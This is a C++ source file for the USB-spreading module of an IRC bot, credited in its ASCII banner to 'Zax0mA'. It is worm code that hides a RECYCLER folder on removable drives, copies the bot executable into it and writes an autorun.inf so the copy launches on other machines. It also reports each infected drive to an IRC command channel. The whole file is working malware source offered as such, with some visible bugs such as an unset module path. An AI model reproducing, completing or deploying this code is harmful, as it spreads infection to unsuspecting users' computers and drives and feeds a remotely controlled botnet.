/*
   ___                                           
 /'___\                                          
/\ \__/  __  __    ___      __   __  __    ____  
\ \ ,__\/\ \/\ \ /' _ `\  /'_ `\/\ \/\ \  /',__\  by Zax0mA
 \ \ \_/\ \ \_\ \/\ \/\ \/\ \L\ \ \ \_\ \/\__, `\
  \ \_\  \ \____/\ \_\ \_\ \____ \ \____/\/\____/ 2.5 
   \/_/   \/___/  \/_/\/_/\/___L\ \/___/  \/___/ 
                            /\____/              
                            \_/__/     
							          
  mUsb.cpp
  -> hooked USB spread
*/

#include "includes.h"
#include "externs.h"
#include <shlwapi.h>
#include <shellapi.h> 


char pending;

int USBinfectDrive(char *drv)
{
	char	szFile[512], szTemp[512], *p, module[MAX_PATH];
	int		i;
	HANDLE	f;
	DWORD	d;

	for (i = 0; i < sizeof(szFile); i++)
		szFile[i] = 0;
	for (i = 0; i < sizeof(szTemp); i++)
		szTemp[i] = 0;

	// create RECYCLER
	strcat(szFile, drv);
	strcat(szFile, USB_STR_RECYCLER);
	if (!CreateDirectory(szFile, NULL) && GetLastError() != ERROR_ALREADY_EXISTS)
		return 1;
	SetFileAttributes(szFile, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_SYSTEM);

	// create RECYCLER sub-dir
	strcat(szFile, USB_STR_REC_SUBDIR);
	if (!CreateDirectory(szFile, NULL) && GetLastError() != ERROR_ALREADY_EXISTS)
		return 1;
	SetFileAttributes(szFile, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_SYSTEM);

	// create Desktop.ini
	strcat(szTemp, USB_STR_DESKTOP_DATA);
	strcat(szFile, USB_STR_DESKTOP_INI);
	f = CreateFile(szFile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM, 0);
	if (f < (HANDLE)1)
		return 1;
	if (!WriteFile(f, USB_STR_DESKTOP_DATA, strlen(USB_STR_DESKTOP_DATA), &d, NULL))
	{
		CloseHandle(f);
		return 1;
	}
	CloseHandle(f);

	// copy .exe file
	p = szFile + strlen(szFile);
	while (p[0] != '\\')
		p--;
	p++;
	*p = 0;
	strcat(szFile, cfg_filename);
	CopyFile(module, szFile, TRUE);
	// todo: add crc or md5 check for file
	SetFileAttributes(szFile, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_SYSTEM);

	// create autorun.inf data
	for (i = 0; i < sizeof(szTemp); i++)
		szTemp[i] = 0;
	p = szFile;
	while (p[0] != '\\')
		p++;
	p++;
	strcat(szTemp, USB_STR_AUTORUN_DATA1);
	strcat(szTemp, p);
	strcat(szTemp, USB_STR_AUTORUN_DATA2);
	strcat(szTemp, p);
	strcat(szTemp, USB_STR_AUTORUN_DATA3);

	// create autorun.inf file
	for (i = 0; i < sizeof(szFile); i++)
		szFile[i] = 0;
	strcat(szFile, drv);
	strcat(szFile, USB_STR_AUTORUN_INF);
	SetFileAttributes(szFile, FILE_ATTRIBUTE_NORMAL);
	f = CreateFile(szFile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY, 0);
	if (f < (HANDLE)1)
		return 1;
	if (!WriteFile(f, szTemp, strlen(szTemp), &d, NULL))
	{
		CloseHandle(f);
		return 1;
	}

	CloseHandle(f);
	return 1;
}

unsigned long WINAPI RemoteUSBThread(void *sock)
{
    char		szTemp[512], buff[512];
	char 		szDrive[3];
	char		*p;
	int			i;
	SOCKET ircconn = (SOCKET)sock;

	for (i = 0; i < sizeof(szTemp); i++)
		szTemp[i] = 0;

	szDrive[0] = 0;
	StrCpyN(szDrive, ":", sizeof(szDrive));

	for (;;)
	{
		Sleep(12000);

		if (pending > 0)
			ExitThread(0);

    	if (GetLogicalDriveStrings(512 - 1, szTemp))
    	{
        	p = szTemp;

        	do
        	{
				*szDrive = *p;

				if (szDrive[0] != 65 && szDrive[0] != 66 && szDrive[0] != 97 && szDrive[0] != 98)
				{
					if (GetDriveType(szDrive) == DRIVE_REMOVABLE)
					{
						if (USBinfectDrive(szDrive) == 0)
						{
							for (i = 0; i < sizeof(buff); i++)
								buff[i] = 0;
							strcat(buff, USB_STR_INFECTED);
							strcat(buff, szDrive);
                            IRC_Send(ircconn, MSG_PRIVMSG, buff, infochan);
						}
					}
				}

           		while (*p++);

			} while (*p);
		}
	}
}

void ThumbDriveCheck(void)
{
  char module[MAX_PATH], szTemp[MAX_PATH];
  
  GetModuleFileName(0, module, sizeof(module));
  StrCpyN(szTemp, module, 3);
  if (GetDriveType(szTemp) == DRIVE_REMOVABLE)
		ShellExecute(NULL, NULL, szTemp, NULL, NULL, SW_SHOWNORMAL);
}

